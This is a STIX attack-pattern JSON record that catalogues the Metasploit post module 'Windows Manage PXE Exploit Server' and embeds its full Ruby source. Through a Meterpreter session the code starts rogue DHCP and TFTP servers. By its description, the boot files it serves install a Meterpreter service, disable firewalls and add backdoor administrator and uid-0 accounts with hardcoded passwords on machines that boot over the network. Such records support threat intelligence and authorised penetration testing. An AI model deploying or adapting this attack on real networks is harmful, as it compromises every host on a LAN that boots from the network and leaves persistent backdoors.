{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a4e6cbe1-55ca-4d3c-a80d-2ecd3eb868e9",
    "created": "2024-08-14T16:33:04.994261Z",
    "modified": "2024-08-14T16:33:04.994264Z",
    "name": "Windows Manage PXE Exploit Server",
    "description": " This module provides a PXE server, running a DHCP and TFTP server. The default configuration loads a linux kernel and initrd into memory that reads the hard drive; placing a payload to install metsvc, disable the firewall, and add a new user metasploit on any Windows partition seen and add a uid 0 user with username and password metasploit to any linux partition seen. The windows user will have the password p@SSw0rd!123456 (in case of complexity requirements) and will be added to the administrators group.  See exploit/windows/misc/pxesploit for a version to deliver a specific payload.  Note: the displayed IP address of a target is the address this DHCP server handed out, not the \"normal\" IP address the host uses. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/pxeexploit.rb",
            "external_id": "pxeexploit.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name' => 'Windows Manage PXE Exploit Server',\n      'Description' => %q{\n        This module provides a PXE server, running a DHCP and TFTP server.\n        The default configuration loads a linux kernel and initrd into memory that\n        reads the hard drive; placing a payload to install metsvc, disable the\n        firewall, and add a new user metasploit on any Windows partition seen,\n        and add a uid 0 user with username and password metasploit to any linux\n        partition seen. The windows user will have the password p@SSw0rd!123456\n        (in case of complexity requirements) and will be added to the administrators\n        group.\n\n        See exploit/windows/misc/pxesploit for a version to deliver a specific payload.\n\n        Note: the displayed IP address of a target is the address this DHCP server\n        handed out, not the \"normal\" IP address the host uses.\n      },\n      'Author' => [ 'scriptjunkie' ],\n      'License' => MSF_LICENSE,\n      'Platform' => [ 'win' ],\n      'SessionTypes' => [ 'meterpreter' ],\n      'Compat' => {\n        'Meterpreter' => {\n          'Commands' => %w[\n            lanattacks_add_tftp_file\n            lanattacks_dhcp_log\n            lanattacks_reset_dhcp\n            lanattacks_set_dhcp_option\n            lanattacks_start_dhcp\n            lanattacks_start_tftp\n            lanattacks_stop_dhcp\n            lanattacks_stop_tftp\n          ]\n        }\n      }\n    )\n\n    register_advanced_options(\n      [\n        OptString.new('TFTPROOT', [\n          false, 'The TFTP root directory to serve files from',\n          File.join(Msf::Config.data_directory, 'exploits', 'pxexploit')\n        ]),\n        OptString.new('SRVHOST', [ false, 'The IP of the DHCP server' ]),\n        OptString.new('NETMASK', [ false, 'The netmask of the local subnet', '255.255.255.0' ]),\n        OptBool.new('RESETPXE', [ true, 'Resets the server to re-exploit already targeted hosts', false ]),\n        OptString.new('DHCPIPSTART', [ false, 'The first IP to give out' ]),\n        OptString.new('DHCPIPEND', [ false, 'The last IP to give out' ])\n      ]\n    )\n  end\n\n  def run\n    if !client.lanattacks\n      print_status('Loading lanattacks extension...')\n      client.core.use('lanattacks')\n    elsif datastore['RESETPXE']\n      print_status('Resetting PXE attack...')\n      client.lanattacks.dhcp.reset\n    end\n\n    # Not setting these options (using autodetect)\n    print_status('Loading DHCP options...')\n    client.lanattacks.dhcp.load_options(datastore)\n\n    0.upto(4) do |i|\n      print_status(\"Loading file #{i + 1} of 5\")\n      contents = File.binread(::File.join(datastore['TFTPROOT'], \"update#{i}\"))\n      client.lanattacks.tftp.add_file(\"update#{i}\", contents)\n    end\n    print_status('Starting TFTP server...')\n    client.lanattacks.tftp.start\n    print_status('Starting DHCP server...')\n    client.lanattacks.dhcp.start\n    print_status('PXEsploit attack started')\n    loop do\n      # get stats every 20s\n      select(nil, nil, nil, 20)\n      client.lanattacks.dhcp.log.each do |item|\n        print_status(\"Served PXE attack to #{item[0].unpack('H2H2H2H2H2H2').join(':')} \" \\\n            \"(#{Rex::Socket.addr_ntoa(item[1])})\")\n        report_note({\n          type: 'PXE.client',\n          data: item[0].unpack('H2H2H2H2H2H2').join(':')\n        })\n      end\n    rescue ::Interrupt\n      print_status('Stopping TFTP server...')\n      client.lanattacks.tftp.stop\n      print_status('Stopping DHCP server...')\n      client.lanattacks.dhcp.stop\n      print_status('PXEsploit attack stopped')\n      return\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}